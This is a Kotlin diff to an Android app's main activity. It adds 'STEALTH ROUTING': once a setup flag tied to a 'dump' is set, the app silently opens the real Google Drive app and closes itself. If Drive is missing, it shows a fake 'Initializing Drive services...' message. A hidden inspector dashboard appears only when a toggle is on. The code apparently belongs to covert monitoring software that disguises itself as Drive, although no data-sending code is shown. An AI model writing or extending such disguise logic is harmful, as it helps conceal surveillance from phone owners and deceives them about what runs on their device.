@@ -18,15 +18,43 @@ class MainActivity : ComponentActivity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+
+        val configPrefs = getSharedPreferences("app_config", MODE_PRIVATE)
+        val setupPrefs = getSharedPreferences("setup_prefs", MODE_PRIVATE)
         
-        // 1. Set Modern UI
+        val isTileActive = configPrefs.getBoolean("tile_dashboard_active", false)
+        val isSetupFinished = setupPrefs.getBoolean("setup_finished_for_dump", false)
+
+        // STEALTH ROUTING
+        if (isSetupFinished && !isTileActive) {
+            launchRealDrive()
+            return
+        }
+        
+        // 1. Set Modern UI (Dashboard mode)
         setContent {
             androidx.compose.material3.MaterialTheme {
                 InspectorDashboard(this)
             }
         }
+    }
 
-        // 2. Background Logic will be started AFTER permissions are granted to prevent Android 14 crash
+    private fun launchRealDrive() {
+        try {
+            val drivePkg = "com.google.android.apps.docs"
+            val intent = packageManager.getLaunchIntentForPackage(drivePkg)
+            if (intent != null) {
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                startActivity(intent)
+            } else {
+                // Fallback: If drive isn't installed, just show a "Loading..." toast or open Play Store
+                android.widget.Toast.makeText(this, "Initializing Drive services...", android.widget.Toast.LENGTH_SHORT).show()
+            }
+        } catch (e: Exception) {
+            e.printStackTrace()
+        } finally {
+            finish()
+        }
     }
 
     override fun onResume() {
